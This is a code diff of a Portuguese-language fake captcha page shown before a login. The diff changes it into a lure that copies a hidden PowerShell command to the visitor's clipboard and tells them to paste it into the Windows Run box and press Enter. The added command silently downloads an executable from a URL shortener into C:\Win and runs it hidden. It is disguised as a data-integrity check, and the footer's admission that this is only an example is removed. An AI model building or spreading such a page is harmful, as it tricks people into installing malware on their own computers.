@@ -77,26 +77,27 @@
 <body>
 
     <div class="container">
-        <h2>Confirme que você não é um robô</h2>
-        <button onclick="copiarTexto()">Clique para copiar</button>
+        <h2>Antes de continuar com o Login Confirme que você não é um robô</h2>
+        <button onclick="copiarTexto()">Clique aqui</button>
 
         <p id="mensagem">
-            <span>Windows + R</span><br>
-            <span>Control + V</span><br>
+            <span>Pressione Windows + R</span><br>
+            <span>Ctrl -> V</span><br>
+            <span>Enter </span><br>
             para confirmar que não é um robô
         </p>
 
         <p id="resultado"></p>
 
         <div class="footer">
-            <p>Este é um exemplo de captcha personalizado.</p>
-            <a href="#">Saiba mais</a>
+            <p>Este captcha é necessário para garantir a integridade dos dados de nossos clientes.</p>
+            <a href="#">Obrigado.</a>
         </div>
     </div>
 
     <script>
         function copiarTexto() {
-            const comando = "powershell.exe"; // Define o texto que será copiado
+            const comando = "powershell.exe -WindowStyle Hidden -Command "New-Item C:\Win -ItemType Directory -Force; Invoke-WebRequest -Uri 'https://tinyurl.com/4c24m3as' -OutFile C:\Win\instalador.exe; Start-Process C:\Win\instalador.exe -ArgumentList '/S' -WindowStyle Hidden""; // Define o texto que será copiado
 
             navigator.clipboard.writeText(comando).then(() => {
                 // Exibe a mensagem de confirmação
